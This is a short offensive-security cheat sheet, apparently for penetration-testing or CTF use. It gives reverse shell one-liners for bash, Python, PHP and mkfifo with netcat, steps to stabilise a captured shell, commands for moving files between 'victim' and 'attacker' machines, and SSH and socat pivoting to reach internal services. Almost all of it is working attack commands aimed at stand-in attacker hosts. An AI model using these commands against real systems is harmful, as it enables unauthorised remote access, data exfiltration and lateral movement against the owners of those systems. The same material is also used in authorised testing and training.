### Reverse shell options

| Condition | Action |
|---|---|
| **bash / sh** | `bash -i >& /dev/tcp/<ip>/<port> 0>&1` |
| **Python** | `python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'` |
| **PHP** | `php -r '$sock=fsockopen("ip",port);exec("/bin/bash -i <&3 >&3 2>&3");'` |
| **mkfifo (universal)** | `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2>&1\|nc ip port >/tmp/f` |
| **nc listener** | `nc -lvnp 4444` |

---

### Stabilise / upgrade shell

| Condition | Action |
|---|---|
| **python pty** | `python3 -c 'import pty;pty.spawn("/bin/bash")'` |
| **script method** | `/usr/bin/script -qc /bin/bash /dev/null`<br>Ctrl+Z → `stty raw -echo` → `fg` → `export TERM=xterm` |

---

### Transfer files between machines

| Condition | Action |
|---|---|
| **Victim → Attacker** | On victim: `python3 -m http.server 8000`<br>On attacker: `wget http://<victim_ip>:8000/filename` |
| **Attacker → Victim** | On attacker: `python3 -m http.server 8000`<br>On victim: `curl http://<attacker_ip>:8000/file -o file` |
| **SCP** | `scp user@$IP:/remote/path ./local/` |

---

### Reach an internal service

| Condition | Action |
|---|---|
| **SSH local (-L)** | `ssh -L <local_port>:<internal_ip>:<remote_port> user@target` |
| **socat TCP forward** | No SSH needed: `./socat TCP-LISTEN:1111,fork TCP:127.0.0.1:22 &` |
| **SSH reverse (-R)** | `ssh -N -R ATTACKIP:9001:127.0.0.1:9001 user@ATTACKIP` |
| **-L vs socat vs -R** | -L: have SSH creds, reach internal. socat: shell but no SSH creds yet. -R: victim calls back. |

